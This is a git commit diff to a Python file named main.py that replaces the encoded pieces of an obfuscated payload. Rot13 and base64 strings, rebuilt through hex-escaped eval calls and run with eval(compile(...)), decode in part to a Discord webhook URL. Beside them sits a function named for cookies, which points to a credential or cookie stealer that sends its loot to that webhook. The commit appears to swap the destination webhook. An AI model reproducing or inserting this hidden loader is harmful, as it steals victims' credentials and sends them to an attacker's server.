eef144055370021f23845d15be7930a490ab7580
HatGirl-zz <120135553+HatGirl-zz@users.noreply.github.com>
2024-06-10 17:57:55 +0200

    Update main.py

--- main.py
+++ main.py
@@ -204,9 +204,9 @@ def TrU57(C00K13s):
     return DETECTED
 import base64, codecs
 magic = 'aG9vayA9ICJodHRwczovL2NhbmFyeS5kaXNjb3JkLmNvbS'
-love = '9upTxiq2IvnT9in3ZiZGV0ZGDlZwLmAmt2BQV1ZmVlAP9K'
-god = 'Qk83eTdPSjZRSlJOZFVNSlJndzg0YzQ0RFZNdjBNbFVCM1'
-destiny = 'cFAz54I1WgZwALG0I2qmN0HISzJUMWrUygMzMjF1uaMPV='
+love = '9upTxiq2IvnT9in3ZiZGV0BGp1AQNjAmRjZmN3BQHmZv9k'
+god = 'a1liZXB0cWxIaEZVUmVmVjM2bjJGMW9qQ19XMjBmZ1BVS1'
+destiny = 'cdqwSgnGWTDmW1G2kjZJ50pHSCMURknwEFoQOkH2u6rvV='
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
